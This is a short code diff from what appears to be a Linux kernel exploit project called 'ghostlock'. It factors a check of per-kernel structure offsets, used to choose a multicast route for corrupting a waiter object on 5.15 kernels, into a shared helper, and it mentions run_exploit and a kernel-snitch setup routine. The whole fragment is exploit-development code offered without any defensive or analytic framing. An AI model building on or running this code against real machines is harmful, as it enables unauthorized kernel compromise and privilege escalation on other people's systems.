@@ -64,16 +64,23 @@ int tcp_route_selected(void) {
           strncmp(active_offsets->uname_r, "5.", 2) != 0);
 }
 
-int kernel5_route_selected(void) {
-  const char *s = getenv("GHOSTLOCK_ROUTE");
-  if (s && *s) {
-    return strcmp(s, "mcast") == 0;
-  }
+/* The geometry a 5.15 entry must carry to mcast-stamp the waiter. Shared by
+ * the route predicate and run_exploit's 5.15 refusal so the two cannot
+ * diverge into a silent fallthrough onto pselect. */
+int mcast_geometry_ok(void) {
   return active_offsets && active_offsets->mcast_waiter_off > 0 &&
          active_offsets->mcast_buffer_size > 0 &&
          (uint32_t)active_offsets->mcast_waiter_off +
                  active_offsets->mcast_lock_offset + 8 <=
              active_offsets->mcast_buffer_size;
+}
+
+int kernel5_route_selected(void) {
+  const char *s = getenv("GHOSTLOCK_ROUTE");
+  if (s && *s) {
+    return strcmp(s, "mcast") == 0;
+  }
+  return mcast_geometry_ok();
 }
 
 void setup_kernelsnitch(void) {
